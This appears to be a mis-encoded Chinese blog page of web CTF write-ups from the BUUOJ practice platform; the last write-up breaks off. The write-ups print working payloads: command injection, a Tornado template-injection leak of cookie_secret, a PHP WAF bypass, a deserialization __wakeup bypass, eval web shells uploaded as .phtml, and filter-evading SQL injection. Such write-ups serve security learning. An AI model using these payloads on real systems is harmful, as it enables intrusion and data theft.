&lt;/h1&gt;&lt;h1 id="gxyctf2019ping-ping-ping"&gt;[GXYCTF2019]Ping Ping Ping
&lt;/h1&gt;&lt;p&gt;&lt;a class="link" href="https://braindance.tk/2020/%5BGXYCTF2019%5DPing%20Ping%20Ping/" target="_blank" rel="noopener"
&gt;ä¼ é€é—¨&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="actf2020-æ–°ç”Ÿèµ›exec"&gt;[ACTF2020 æ–°ç”Ÿèµ›]Exec
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121090002.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;è‚¯å®šæ˜¯å°è¯•ç®¡é“ç¬¦&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;127.0.0.1|cat /flag
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="æŠ¤ç½‘æ¯-2018easy_tornado"&gt;[æŠ¤ç½‘æ¯ 2018]easy_tornado
&lt;/h1&gt;&lt;p&gt;æ‰“å¼€é¡µé¢ä¸‰ä¸ªè¶…é“¾æ¥&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;/flag.txt&lt;/p&gt;
&lt;p&gt;/welcome.txt&lt;/p&gt;
&lt;p&gt;hints.txt&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å†…å®¹åˆ†åˆ«æ˜¯&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;flag in /fllllllllllllag&lt;/p&gt;
&lt;p&gt;render&lt;/p&gt;
&lt;p&gt;md5(cookie_secret+md5(filename))&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;è¿›å…¥hints.txtæ³¨æ„åˆ°urlåœ°å€æ­¤æ—¶ä¸º&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/file?filename=/hints.txt&amp;amp;filehash=2a84a09bc1d5e3d8745131754ff208fa
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å†æ ¹æ®hints.txtæ–‡ä»¶çš„å†…å®¹ï¼Œæ¨æ–­å¯ä»¥ä½¿ç”¨urlæ–¹å¼è®¿é—®æ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦æä¾›&lt;strong&gt;filehash&lt;/strong&gt;å€¼ï¼ŒåŠ å¯†çš„æ–¹æ³•å³hints.txtçš„å†…å®¹ï¼šmd5(cookie_secret+md5(filename))ã€‚flagæ–‡ä»¶çš„åç§°&lt;code&gt;filename&lt;/code&gt;æœ‰äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è·å–&lt;code&gt;cookie_secret&lt;/code&gt;çš„å€¼ã€‚&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥è§¦åŠåˆ°ç›²åŒºäº†ï¼Œè·å–cookie_secretæ˜¯çœ‹wpã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µ renderé…åˆTornadoä½¿ç”¨&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;åœ¨tornadoæ¨¡æ¿ä¸­ï¼Œå­˜åœ¨ä¸€äº›å¯ä»¥è®¿é—®çš„å¿«é€Ÿå¯¹è±¡,è¿™é‡Œç”¨åˆ°çš„æ˜¯handler.settingsï¼Œhandler æŒ‡å‘RequestHandlerï¼Œè€ŒRequestHandler.settingsåˆæŒ‡å‘self.application.settingsï¼Œæ‰€ä»¥handler.settingså°±æŒ‡å‘RequestHandler.application.settingsäº†ï¼Œè¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬çš„ä¸€äº›ç¯å¢ƒå˜é‡&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;è·å–cookie_secretçš„payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/error?msg={{handler.settings}}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121091616.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;è·å¾—cookie_secretçš„å€¼ä¸º&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;eb326d39-cd67-47bd-b2d3-71125996417b
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ ¹æ®hints.txtçš„urléªŒè¯ä¸€ä¸‹æ˜¯å¦‚ä½•åŠ å¯†çš„ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121092122.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;é€‰ä¸­çš„è“è‰²éƒ¨åˆ†æ˜¯&lt;code&gt;/hints.txt&lt;/code&gt;åŠ å¯†åçš„md5å€¼ã€‚æ¨æ–­å‡ºfilehashæ ¼å¼ä»¥åç›´æ¥è®¿é—®flagæ–‡ä»¶ï¼Œpayloadï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/file?filename=/hints.txt&amp;amp;filehash=2a84a09bc1d5e3d8745131754ff208fa
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019knife"&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121092431.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;ä¸€å¥è¯ç›´æ¥è¿ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="roarctf-2019easy-calc"&gt;[RoarCTF 2019]Easy Calc
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121092956.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªè®¡ç®—å™¨éšä¾¿è¯•ä¸€è¯•ï¼Œå½“è¾“å…¥å­—æ¯æ—¶ä¼šæŠ¥é”™ã€‚æŸ¥çœ‹ç½‘é¡µæºç ï¼Œåœ¨scriptä¸­å‘ç°äº†è¿è¡Œè®¡ç®—å™¨çš„phpæ–‡ä»¶ï¼š&lt;strong&gt;calc.php&lt;/strong&gt;ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä¸€å¥å¾ˆé‡è¦çš„æ³¨é‡Š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;!--I&amp;#39;ve set up WAF to ensure security.--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121093233.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;phpçš„æ­£åˆ™è¡¨è¾¾å¼ä¸­å¹¶æ²¡æœ‰è¿‡æ»¤å­—æ¯çš„æ¡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬è¾“å…¥å­—æ¯è¢«è¿‡æ»¤æ˜¯å› ä¸º&lt;strong&gt;WAF&lt;/strong&gt;ï¼Œæ¥ä¸‹æ¥æ˜¯å‚è€ƒç½‘ä¸Šçš„wpè‡ªå·±çš„ç†è§£&lt;/p&gt;
&lt;p&gt;å¯ä»¥åœ¨calc.phpä¼ å‚&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;? num=a
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;phpä¼šè¾“å‡ºä¸€ä¸ªå€¼aï¼Œè¯´æ˜å·²ç»ç»•è¿‡äº†WAFã€‚è¿™é‡Œä½¿ç”¨çš„æ˜¯WAFå’Œphpè§£ææ–¹æ³•ä¸ä¸€æ ·ï¼ŒWAFè§£æåˆ°ç©ºæ ¼&amp;rsquo; &amp;lsquo;ä¼šç›´æ¥è¿‡æ»¤æ‰ï¼Œè¿™æ ·WAFè®¤ä¸ºä¼ å…¥çš„å°±æ˜¯ä¸€ä¸ªç©ºå€¼ï¼Œå¹¶ä¸ä¼šè¯†åˆ«numï¼Œä½†æ˜¯phpè§£æçš„æ—¶å€™ä¼šæŠŠç©ºæ ¼å»æ‰ï¼Œè¿™æ ·å°±èƒ½getåˆ°numçš„å€¼ã€‚&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥ç»•è¿‡æ­£åˆ™å°±å¯ä»¥ä½¿ç”¨char()çš„æ–¹å¼ä½¿ç”¨asciiç è½¬ã€‚ç©ºæ ¼è¢«è¿‡æ»¤ä½†æ˜¯æƒ³ä½¿ç”¨phpè¾“å‡ºå¯ä»¥ä½¿ç”¨var_dump()&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹æ ¹ç›®å½•ä¸‹æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨scandirï¼ˆï¼‰éå†æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­charï¼ˆ47ï¼‰&amp;mdash;&amp;mdash;&amp;gt; &amp;lsquo;/&amp;rsquo; ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;? num=1;var_dump(scandir(chr(47)))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ‰¾åˆ°äº†ç–‘ä¼¼flagæ–‡ä»¶ï¼šf1aggï¼Œä½¿ç”¨file_get_contentsï¼ˆï¼‰è¯»å–æ–‡ä»¶&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019http"&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]Http
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121104213.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹æºç åœ¨&amp;quot;æ°›å›´&amp;quot;è¿™ä¸¤ä¸ªå­—ä¸Šæœ‰éšè—çš„è·³è½¬Secret.phpã€‚è¿›å…¥ä»¥åé¡µé¢æ˜¾ç¤º&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;It doesn&amp;#39;t come from &amp;#39;https://www.Sycsecret.com&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æç¤ºé¡µé¢ä¸æ˜¯æ¥è‡ªè¿™ä¸ªç½‘å€ï¼Œæ‰€ä»¥åœ¨HackBarä¸ŠåŠ ä¸ŠRefererã€‚ä¹‹ååˆæç¤º&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;Please use &amp;#34;Syclover&amp;#34; browser
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åŠ ä¸ŠUser-Agentã€‚æç¤º&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;No!!! you can only read this locally!!!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åŠ ä¸ŠX-Forwarded-Forã€‚&lt;a class="link" href="https://www.runoob.com/w3cnote/http-x-forwarded-for.html" target="_blank" rel="noopener"
&gt;HTTP X-Forwarded-For ä»‹ç»&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æœ€ç»ˆçš„è¯·æ±‚å¤´ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GET /Secret.php HTTP/1.1
Host: node3.buuoj.cn:26715
Upgrade-Insecure-Requests: 1
User-Agent: Syclover
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
x-forwarded-for: 127.0.0.1
referer: https://www.Sycsecret.com
Connection: close
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019php"&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121105104.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æºç å¤‡ä»½åœ¨&lt;code&gt;www.zip&lt;/code&gt;ä¸­ã€‚ä¸‹è½½ä»¥åæœ‰äº”ä¸ªæ–‡ä»¶&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;class.php&lt;/p&gt;
&lt;p&gt;flag.php&lt;/p&gt;
&lt;p&gt;index.js&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;p&gt;style.css&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;åœ¨index.phpä¸­æœ‰ä¸€æ®µä»£ç &lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include &amp;#39;class.php&amp;#39;;
$select = $_GET[&amp;#39;select&amp;#39;];
$res=unserialize(@$select);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å†ç»“åˆåˆä¸€ä¸ªclass.phpï¼Œæ‰€ä»¥è¿™é“é¢˜è€ƒç‚¹åº”è¯¥æ˜¯ååºåˆ—åŒ–ã€‚&lt;/p&gt;
&lt;p&gt;class.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include &amp;#39;flag.php&amp;#39;;
error_reporting(0);
class Name{
private $username = &amp;#39;nonono&amp;#39;;
private $password = &amp;#39;yesyes&amp;#39;;
public function __construct($username,$password){
$this-&amp;gt;username = $username;
$this-&amp;gt;password = $password;
}
function __wakeup(){
$this-&amp;gt;username = &amp;#39;guest&amp;#39;;
}
function __destruct(){
if ($this-&amp;gt;password != 100) {
echo &amp;#34;&amp;lt;/br&amp;gt;NO!!!hacker!!!&amp;lt;/br&amp;gt;&amp;#34;;
echo &amp;#34;You name is: &amp;#34;;
echo $this-&amp;gt;username;echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
echo &amp;#34;You password is: &amp;#34;;
echo $this-&amp;gt;password;echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
die();
}
if ($this-&amp;gt;username === &amp;#39;admin&amp;#39;) {
global $flag;
echo $flag;
}else{
echo &amp;#34;&amp;lt;/br&amp;gt;hello my friend~~&amp;lt;/br&amp;gt;sorry i can&amp;#39;t give you the flag!&amp;#34;;
die();
}
}
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è·å–flagçš„ä»£ç ä½ç½®æ˜¯30-32è¡Œã€‚åˆ†æè¿™ä¸ªNameå¯¹è±¡ï¼Œåˆ›å»ºå¯¹è±¡æ—¶å¯ä»¥ä¸ºå¯¹è±¡èµ‹å€¼ï¼Œå¯¹è±¡é”€æ¯æ—¶ä¼šåˆ¤æ–­passwordå€¼æ˜¯å¦æ˜¯100ï¼Œä¸”usernameå€¼æ˜¯å¦ä¸ºadminï¼Œå¦‚æœä¸¤è€…éƒ½æˆç«‹è¾“å‡ºflagï¼Œä½†æ˜¯__wakeupï¼ˆï¼‰ä¼šåœ¨ååºåˆ—åŒ–æ—¶è°ƒç”¨å°†usernameå€¼ç½®ä¸ºguestï¼Œæ‰€ä»¥éœ€è¦ååºåˆ—åŒ–é€ƒé€¸ã€‚è¿™é‡Œé¢æœ‰ååºåˆ—åŒ–è®²è§£&lt;a class="link" href="https://www.cnblogs.com/zy-king-karl/p/11436872.html" target="_blank" rel="noopener"
&gt;CVE-2016-7124æ¼æ´å¤ç°&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä½¿ç”¨çš„æ„é€ å¯¹è±¡&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class Name{
private $username =&amp;#39;admin&amp;#39;;
private $password =&amp;#39;100&amp;#39;;
}
$a = new Name;
echo serialize($a);
O:4:&amp;#34;Name&amp;#34;:2:{s:14:&amp;#34;%00Name%00username&amp;#34;;s:5:&amp;#34;admin&amp;#34;;s:14:&amp;#34;%00Name%00password&amp;#34;;s:3:&amp;#34;100&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ååºåˆ—åŒ–é€ƒé€¸ï¼Œä½¿å¯¹è±¡å±æ€§çš„æ•°é‡å¤§äºåŸæ¥çš„å€¼ï¼Œå°±å¯ä»¥ç»•è¿‡wakeupå‡½æ•°ã€‚æœ€ç»ˆpayload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?select=O:4:&amp;#34;Name&amp;#34;:3:{s:14:&amp;#34;%00Name%00username&amp;#34;;s:5:&amp;#34;admin&amp;#34;;s:14:&amp;#34;%00Name%00password&amp;#34;;s:3:&amp;#34;100&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019upload"&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121111429.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;å…ˆå°è¯•ä¸Šä¼ ä¸€ä¸ªgifå›¾ç‰‡é©¬å†…å®¹ä¸º&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GIF89a
&amp;lt;?php
@eval($_POST[&amp;#39;a&amp;#39;]);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;é¡µé¢æç¤ºè¿‡æ»¤ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;NO! HACKER! your file included &amp;lsquo;&amp;lt;?&amp;rsquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å°è¯•scriptæ‰§è¡Œphpä»£ç &lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt;eval($_POST[&amp;#39;cmd&amp;#39;])&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¯ä»¥ä¸Šä¼ ï¼Œæ–‡ä»¶åœ¨/uploadç›®å½•ä¸‹ã€‚å°è¯•ä¿®æ”¹åç¼€ä¸Šä¼ ï¼Œphtmlä¸Šä¼ æˆåŠŸï¼Œå¯ä»¥æ‰§è¡Œphpå’Œscriptä»£ç ï¼Œä½¿ç”¨èšå‰‘è¿æ¥ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121112135.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="20210128"&gt;2021.01.28
&lt;/h1&gt;&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019babysql"&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210128113412.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;å°è¯•ä¸‡èƒ½å¯†ç ï¼Œå‘ç°æŠ¥é”™äº†ï¼š1=1#&amp;rsquo; and password=&amp;lsquo;123&amp;rsquo;ï¼Œä¹Ÿè®¸æ˜¯orè¢«è¿‡æ»¤äº†æˆ–è€…åˆ æ‰äº†ï¼Œå°è¯•å¤§å°å†™æ— æœï¼Œä½†æ˜¯å°è¯•åŒå†™é€šè¿‡äº†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯çˆ†è¡¨ï¼Œçˆ†æ•°æ®åº“çš„è¯­å¥ä¸­æœ‰&lt;strong&gt;information&lt;/strong&gt;è¿™ä¸ªè¯ï¼Œå…¶ä¸­çš„&lt;strong&gt;for&lt;/strong&gt;ä¹Ÿä¼šè¢«è¿‡æ»¤ã€‚å…¶ä»–è¿‡æ»¤çš„è¯æˆ‘é‡åˆ°çš„æœ‰ï¼šunionï¼Œselectã€fromã€whereã€andã€‚&lt;/p&gt;
&lt;p&gt;çˆ†æ•°æ®åº“ï¼ˆå¡«å¯†ç ï¼‰ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;çˆ†è¡¨ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name=&amp;#39;b4bsql&amp;#39; #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;çˆ†å­—æ®µå€¼ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql #
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="actf2020-æ–°ç”Ÿèµ›upload"&gt;[ACTF2020 æ–°ç”Ÿèµ›]Upload
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210128114257.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æŒ‡é’ˆæ”¾åœ¨ç¯æ³¡ä¸ŠæŠ¤æ˜¾ç¤ºä¸Šä¼ æ–‡ä»¶çš„ï¼Œå›¾ç‰‡é©¬&lt;/p&gt;
&lt;p&gt;233.gif&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GIF89a
&amp;lt;?php
@eval($_POST[&amp;#39;a&amp;#39;]);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å°è¯•phtmlæ˜¯å¦è¢«è¿‡æ»¤ï¼Œç›´æ¥ä¸Šä¼ æˆåŠŸã€‚èšå‰‘è¿æ¥&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;------WebKitFormBoundaryUMSByAQmR2cduL6R
Content-Disposition: form-data; name=&amp;#34;upload_file&amp;#34;; filename=&amp;#34;233.phtml&amp;#34;
Content-Type: image/gif
GIF89a
&amp;lt;?php
@eval($_POST[&amp;#39;a&amp;#39;]);
------WebKitFormBoundaryUMSByAQmR2cduL6R
Content-Disposition: form-data; name=&amp;#34;submit&amp;#34;
upload
------WebKitFormBoundaryUMSByAQmR2cduL6R--
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="actf2020-æ–°ç”Ÿèµ›backupfile"&gt;[ACTF2020 æ–°ç”Ÿèµ›]BackupFile
&lt;/h1&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;Try to find out source file!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;é¢˜ç›®æç¤ºå¤‡ä»½æ–‡ä»¶ï¼Œå¤‡ä»½æ–‡ä»¶å¸¸è§åç¼€ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;.git .svn .swp .~ .bak .bash_history&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å°è¯•index.php.bakï¼Œä¸‹è½½äº†ä¸€ä¸ªå¤‡ä»½æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include_once &amp;#34;flag.php&amp;#34;;
if(isset($_GET[&amp;#39;key&amp;#39;])) {
$key = $_GET[&amp;#39;key&amp;#39;];
if(!is_numeric($key)) {
exit(&amp;#34;Just num!&amp;#34;);
}
$key = intval($key);
$str = &amp;#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&amp;#34;;
if($key == $str) {
echo $flag;
}
}
else {
echo &amp;#34;Try to find out source file!&amp;#34;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¼ ä¸€ä¸ªå¿…é¡»ä¸ºæ•°å­—çš„å‚æ•°keyï¼Œä½¿ç”¨intvalï¼ˆï¼‰å‡½æ•°å¤„ç†ï¼Œå­—ç¬¦ä¸²ç›¸ç­‰åˆ™è¾“å‡ºflagã€‚è¿™å°±æƒ³åˆ°äº†PHPä¸­çš„&lt;code&gt;==&lt;/code&gt;å’Œ&lt;code&gt;===&lt;/code&gt;çš„åŒºåˆ«ã€‚è´´ä¸€æ®µç®€å•ä»£ç &lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$str = &amp;#39;abc&amp;#39;;
if(0==$str){
echo &amp;#34;çœŸ&amp;#34;;
}else{
echo &amp;#34;å‡&amp;#34;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;==&lt;/code&gt;åœ¨æ‰§è¡Œå…³ç³»è¿ç®—æ—¶ï¼Œè¦æ±‚è¿ç®—ç¬¦ä¸¤è¾¹çš„æ•°æ®ç±»å‹å¿…é¡»ä¸€è‡´ï¼Œæ‰€ä»¥ç­‰å·å³è¾¹çš„å­—ç¬¦ä¸²è¢«å¼ºåˆ¶è½¬æ¢ä¸ºäº†æ•´å‹ï¼Œè‹¥æœ‰ä¸€æ–¹ä¸ºæ•°å­—ï¼Œå¦ä¸€æ–¹ä¸ºå­—ç¬¦ä¸²æˆ–ç©ºæˆ–nullï¼Œå‡ä¼šå…ˆå°†éæ•°å­—ä¸€æ–¹è½¬åŒ–ä¸º0ï¼Œå†åšæ¯”è¾ƒã€‚å¦‚æœå­—ç¬¦ä¸²æ˜¯ä»¥æ•°å­—å¼€å¤´çš„ï¼Œå°±ä¼šæˆªå–ç›´åˆ°é‡åˆ°ç¬¬ä¸€ä¸ªå­—æ¯ã€‚&lt;/p&gt;
&lt;p&gt;å…¨ç­‰äº&lt;code&gt;===&lt;/code&gt;æ“ä½œè¿‡ç¨‹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ“ä½œç¬¦ä¸¤è¾¹çš„æ•°æ®ç±»å‹å¦‚æœä¸ç›¸åŒï¼Œè¿”å›false ã€‚&lt;/li&gt;
&lt;li&gt;æ“ä½œç¬¦ä¸¤è¾¹çš„å€¼å¦‚æœä¸ç›¸åŒï¼Œè¿”å›false ã€‚&lt;/li&gt;
&lt;li&gt;æœ€åå°†ä¸Šé¢2æ­¥çš„æ“ä½œè¿›è¡Œä¸æ“ä½œã€‚è¿”å›ä¸æ“ä½œçš„ç»“æœã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æ‰€ä»¥æœ€ç»ˆçš„payloadï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?key=123
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="hctf-2018admin"&gt;[HCTF 2018]admin
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210202182820.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥åœ¨æ³¨é‡Šé‡Œæ‰¾åˆ°&lt;/p&gt;
&lt;blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ€è·¯åº”è¯¥æ˜¯åªè¦æˆ‘ä»¬æ˜¯adminç™»é™†å°±å¯ä»¥å¾—åˆ°flagï¼Œå¯ä»¥æ‰¾åˆ°æ³¨å†ŒæŒ‰é’®ï¼Œä¸èƒ½æ³¨å†Œadmin,é‚£å°±éšä¾¿æ³¨å†Œä¸€ä¸ªè¿›å»çœ‹çœ‹ã€‚æ‰¾åˆ°å‡ ä¸ªåŠŸèƒ½ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;postã€‚å‘è¡¨æ–‡ç« ï¼Œä½†æ˜¯æ²¡èƒ½æ‰¾åˆ°åœ¨å“ªé‡Œæ‰“å¼€&lt;/li&gt;
&lt;li&gt;change passwordã€‚æ”¹å¯†ç ï¼Œå°è¯•ä¸‹èƒ½ä¸èƒ½æŠ“åŒ…æ”¹åˆ°adminçš„å¯†ç &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¿®æ”¹å¯†ç æŠ“åˆ°çš„åŒ…ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210202183647.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æ„Ÿè§‰å¹¶æ²¡æœ‰ä»€ä¹ˆä¸‹æ‰‹çš„åœ°æ–¹ï¼Œå”¯ä¸€çš„å°±æ˜¯sessionå¯èƒ½å’Œèº«ä»½æœ‰å…³ã€‚&lt;/p&gt;
&lt;p&gt;ä»¥ä¸‹çš„æ˜¯çœ‹ç½‘ä¸Šçš„wp&lt;/p&gt;
&lt;p&gt;åœ¨change passwordé¡µé¢æŸ¥çœ‹æºç ï¼Œå‘ç°æä¾›äº†é¢˜ç›®çš„æºç åœ°å€&lt;/p&gt;
